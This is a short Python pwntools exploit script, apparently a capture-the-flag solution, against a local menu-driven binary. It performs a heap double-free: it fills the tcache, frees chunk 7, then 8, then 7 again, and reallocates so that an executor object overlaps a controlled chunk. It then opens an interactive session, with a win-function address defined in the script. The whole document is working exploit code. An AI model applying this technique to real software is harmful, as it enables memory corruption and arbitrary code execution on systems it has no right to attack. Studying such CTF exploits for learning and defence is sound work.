from pwn import * 

elf = ELF('./out')

win_addr = 0x00000000004017a2

def allocPerson(r, index, size, name, age):
    r.sendlineafter(b':', b'1')
    r.sendlineafter(b':', index)
    r.sendlineafter(b':', size)
    r.sendlineafter(b':', name)
    r.sendlineafter(b':', age)

def allocExecutor(r):
    r.sendlineafter(b':', b'2')

def execCommand(r):
    r.sendlineafter(b':', b'4')

def delPerson(r, index):
    r.sendlineafter(b':', b'5')
    r.sendlineafter(b':', index)


r = elf.process()


for i in range(9):
    allocPerson(r, str(i).encode(), b'1', b'1', b'1')

for i in range(7):
    delPerson(r, str(i).encode())

delPerson(r, b'7')
delPerson(r, b'8')
delPerson(r, b'7')

for i in range(7):
    allocPerson(r, str(i).encode(), b'1', b'1', b'1')

allocExecutor(r)
allocPerson(r, b'8', b'1', b'1', b'1')
allocPerson(r, b'7', b'1', b'1', b'1')


r.interactive()
